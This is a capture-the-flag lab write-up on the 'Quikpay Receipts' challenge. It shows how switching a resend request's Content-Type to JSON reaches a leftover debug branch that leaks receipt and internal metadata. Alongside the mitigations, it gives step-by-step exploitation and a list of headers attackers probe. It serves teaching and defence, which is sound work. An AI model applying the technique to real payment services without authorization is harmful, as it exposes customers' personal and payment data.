---
title: "Information Disclosure – Debug Branch Receipt Exposure | Quikpay Receipts"
date: 2026-05-29 00:00:00 +0530
categories: [A02 - Security Misconfiguration, Information Disclosure]
tags: [webversepro, information-disclosure, debug-mode, content-type, api, receipts]
author: Shivansh Sharma
image:
path: /assets/images/posts/quikpay-receipts-information-disclosure.webp
alt: Information Disclosure – Debug Branch Receipt Exposure | Quikpay Receipts
------------------------------------------------------------------------------

## Lab Link

Lab: [Quikpay Receipts](https://dashboard.webverselabs-pro.com/challenges/double-entry)

---

## Overview

Quikpay Receipts is a payment receipt service used by small software merchants. The application allows customers to resend receipt emails through a public receipt page.

The intended endpoint accepts form-encoded data and returns only a minimal acknowledgement. However, a forgotten debug branch changes the response behavior when the request is sent with a different content type.

By changing the request from `application/x-www-form-urlencoded` to `application/json`, the endpoint returns full receipt details and internal debug metadata.

This results in information disclosure through an exposed debug response path.

---

## Objective

Identify the resend endpoint, alter the request content type, trigger the debug branch, and extract the flag from the internal receipt metadata.

---

## Vulnerability Identification

This challenge is primarily an Information Disclosure vulnerability.

### Classification Hierarchy

A02 - Security Misconfiguration
└── Exposed Debug Behavior
└── Information Disclosure
└── Internal Receipt Metadata Exposure

---

## Reconnaissance

Navigate to the developer documentation page:

```text
https://0000e59e-4065-double-entry-eafd2.challenges.webverselabs-pro.com/developers
```

The documentation describes the receipt resend functionality:

```http
POST /receipt/<token>/resend
Content-Type: application/x-www-form-urlencoded

email=customer@example.com
```

The expected response is only a JSON acknowledgement:

```json
{
  "ok": true,
  "message": "Receipt qp-r4-7821ab resent to the email on file"
}
```

The note also states that the endpoint should not echo the receipt body back to the client.

That statement is important because it defines the expected security boundary.

---

## Exploitation

### Step 1 - View a Receipt

Open a public receipt:

```text
https://0000e59e-4065-double-entry-eafd2.challenges.webverselabs-pro.com/receipt/qp-r4-9981kl
```

The page includes an option to resend the receipt.

---

### Step 2 - Capture the Resend Request

Click the resend button and inspect the request in Burp Suite.

The request targets:

```http
POST /receipt/qp-r4-9981kl/resend
```

The expected content type is:

```http
Content-Type: application/x-www-form-urlencoded
```

This matches the developer documentation.

---

### Step 3 - Modify the Content Type

Change the request header to:

```http
Content-Type: application/json
```

Then resend the request.

This triggers a different server-side behavior than the normal form submission path.

---

### Step 4 - Observe the Debug Response

Instead of returning only a resend acknowledgement, the endpoint returns detailed receipt data and debug metadata.

Relevant response snippet:

```json
{
  "debug": {
    "exporter_version": "qp-export/2.4",
    "internal_ref": "WEBVERSE{.....}",
    "ledger_batch": "lb-2026-w20",
    "reconciled": true
  },
  "ok": true,
  "receipt": {
    "amount": "468.00",
    "card_brand": "Mastercard",
    "currency": "USD",
    "customer_email": "priya@vasanth.io",
    "last4": "8801",
    "merchant": "Northvane Software",
    "merchant_domain": "northvane.dev",
    "paid_at": "2026-05-14 02:18 UTC",
    "status": "pending",
    "token": "qp-r4-9981kl"
  }
}
```

The flag is exposed inside:

```json
{
  "internal_ref": "WEBVERSE{.....}"
}
```

---

## Proof of Exploitation

### Normal Endpoint

```http
POST /receipt/qp-r4-9981kl/resend
Content-Type: application/x-www-form-urlencoded
```

### Modified Header

```http
Content-Type: application/json
```

### Sensitive Field

```json
{
  "internal_ref": "WEBVERSE{.....}"
}
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can retrieve information that should only be available to internal merchant or support dashboards.

Potentially exposed data includes:

* Customer email addresses
* Payment amounts
* Card metadata
* Merchant information
* Ledger batch identifiers
* Internal reconciliation status
* Debug references

In a real payment service, exposing receipt metadata could create privacy, compliance, and fraud risks.

---

## Mitigation

### Remove Debug Branches from Production

Debug-only response paths should not be reachable in production.

### Enforce Consistent Response Behavior

Changing `Content-Type` should not change authorization boundaries or reveal additional data.

### Validate Request Content Types

Reject unexpected request formats with:

```http
415 Unsupported Media Type
```

### Apply Authorization to Internal Views

Detailed receipt exports should require merchant/support authorization.

### Avoid Returning Internal Metadata

Do not expose fields such as:

```text
internal_ref
ledger_batch
reconciled
exporter_version
```

to public endpoints.

---

## Real-World Insight

APIs often contain multiple code paths depending on request content type, headers, or body format.

Attackers frequently test:

```text
Content-Type
Accept
X-Debug
X-Requested-With
format
mode
```

because alternate parsing branches sometimes expose debug behavior or internal data.

The Quikpay Receipts challenge demonstrates a practical lesson:

**A public endpoint must remain safe across every supported request shape, not only the one used by the frontend.**
